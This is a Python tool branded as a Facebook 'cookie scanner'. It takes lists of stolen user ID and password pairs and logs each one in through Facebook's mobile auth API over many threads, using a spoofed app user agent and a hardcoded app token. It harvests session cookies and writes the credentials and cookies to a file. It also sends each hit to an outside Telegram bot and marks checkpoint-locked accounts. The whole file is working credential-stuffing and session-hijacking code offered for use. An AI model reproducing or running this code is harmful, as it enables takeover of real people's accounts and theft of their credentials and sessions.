import os
import re
import time
import uuid
import random
import requests
import sys
import json
from concurrent.futures import ThreadPoolExecutor as tred

# --- COLOR CODES ---
X = '\033[1;37m' # White
G = '\033[38;5;46m' # Green
Y = '\033[38;5;220m' # Yellow
R = '\033[38;5;196m' # Red
C = '\033[1;36m' # Cyan
W = '\033[1;37m' # White

# --- CONFIG ---
oks = []
loop = 0
TELE_TOKEN = ""
CHAT_ID = ""

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    clear()
    print(f"""{G}
        
                   (\  (\
  („• ֊ •„)   COOKIE SCANNER 🍪
  ━O━O━━━━━━━━━━━━━━━━━━━━━━━
  [CYBNUX SPECTER 0x13]
  SYSTEM: GET COOKIE MODE
  ============================
  TOOL BY Tran Dang Phu & Cybnux
{W}""")

def load_config():
    global TELE_TOKEN, CHAT_ID
    if os.path.exists('config.json'):
        with open('config.json', 'r') as f:
            data = json.load(f)
            TELE_TOKEN = data.get('TELE_TOKEN', '')
            CHAT_ID = data.get('CHAT_ID', '')

def send_tg_cookie(uid, pw, cookie):
    if not TELE_TOKEN or not CHAT_ID: return
    msg = f"🍪  GET COOKIE SUCCESS!\n━━━━━━━━━━━━\n🆔 ID: {uid}\n🔑 MK: {pw}\n🍪 COOKIE: {cookie}\n━━━━━━━━━━━━"
    url = f"https://api.telegram.org/bot{TELE_TOKEN}/sendMessage"
    try: requests.get(url, params={"chat_id": CHAT_ID, "text": msg})
    except: pass

def get_cookie_logic(uid, pw):
    global loop
    sys.stdout.write(f"\r\r{W}[{G}CYBNUX-SCAN{W}] {loop} | OK: {G}{len(oks)}{W}")
    sys.stdout.flush()
    
    session = requests.Session()
    # User Agent App FB Android
    ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36 [FBAN/FB4A;FBAV/443.0.0.30.117;FBBV/545043810;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/546418861;FBCR/Verizon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950F;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    
    data = {
        'adid': str(uuid.uuid4()),
        'format': 'json',
        'device_id': str(uuid.uuid4()),
        'cpl': 'true',
        'family_device_id': str(uuid.uuid4()),
        'credentials_type': 'device_based_login_password',
        'error_detail_type': 'button_with_disabled',
        'source': 'device_based_login',
        'email': uid,
        'password': pw,
        'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
        'generate_session_cookies': '1', # FORCING COOKIE GENERATION
        'generate_analytics_claim': '1',
        'generate_machine_id': '1',
        'method': 'auth.login',
        'fb_api_req_friendly_name': 'authenticate',
    }
    
    headers = {
        'User-Agent': ua,
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': 'graph.facebook.com',
        'X-FB-Connection-Type': 'MOBILE.LTE',
    }

    try:
        res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers).json()
        if 'session_cookies' in res:
            # SUCCESS
            cookies = res['session_cookies']
            cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
            print(f"\n{G}[■] OK-COOKIE: {uid}|{pw}{W}")
            with open('COOKIE-RESULT.txt', 'a') as f:
                f.write(f"{uid}|{pw}|{cookie_str}\n")
            send_tg_cookie(uid, pw, cookie_str)
            oks.append(uid)
            return True
        elif 'error' in res and 'www.facebook.com' in str(res):
            # Checkpoint
            print(f"\n{Y}[●] CP-LOCKED: {uid}|{pw}{W}")
            return False
    except: pass
    return False

def start_scan_file():
    banner()
    print(f"{C}[*] MODE: EXTRACT COOKIE FROM OK-LIST")
    print(f"{W}Note: File format must be UID|PASS|...{W}")
    file_path = input(f"{Y}[?] Path to OK-List (e.g., DTD-OLD-M1-OK.txt): {W}").strip()
    if not file_path: 
        print(f"{R}[!] File path required!")
        time.sleep(2)
        return main()
    
    try:
        data_list = []
        with open(file_path, 'r') as f:
            for line in f:
                if '|' in line:
                    parts = line.strip().split('|')
                    if len(parts) >= 2:
                        uid = parts[0]
                        pw = parts[1]
                        data_list.append((uid, pw))
    except:
        print(f"{R}[!] File not found!")
        time.sleep(2)
        return main()

    banner()
    print(f"{G}[+] LOADED {len(data_list)} ACCOUNTS. EXTRACTING COOKIES...{W}")
    print("-" * 40)
    
    with tred(max_workers=10) as pool:
        for uid, pw in data_list:
            pool.submit(get_cookie_logic, uid, pw)
    
    print(f"\n{G}-----------------------------------")
    print(f"[*] EXTRACTION FINISHED. TOTAL COOKIES: {len(oks)}")
    print(f"[*] DATA SAVED IN COOKIE-RESULT.txt")
    input(f"{Y}Press Enter to go back...")
    main()

def main():
    try:
        load_config()
        banner()
        print(f"{C}[1]{W} SCAN FROM FILE OK-LIST & GET COOKIE")
        print(f"{C}[2]{W} MANUAL INPUT UID|PASS & GET COOKIE")
        print(f"{C}[3]{W} EXIT")
        choice = input("Select Option (1/2/3): ").strip()
        
        if choice == '1':
            start_scan_file()
        elif choice == '2':
            try:
                print("=== FB API FULL DATA ANALYZER ===")
                u = input("Nhap UID: ").strip()
                p = input("Nhap Pass: ").strip()
                if u and p:
                    get_cookie_logic(u, p)
                else:
                    print("[!] Vui long khong de trong!")
                input("\nNhan Enter de thoat...")
            except Exception as e:
                print(f"\n[!] Da xay ra loi: {e}")
                input("Nhan Enter de tiep tuc...")
            main()
        else:
            sys.exit()
    except Exception as e:
        print(f"\n[!] Looi: {e}")
        input("Nhan Enter de thoat...")

if __name__ == "__main__":
    main()
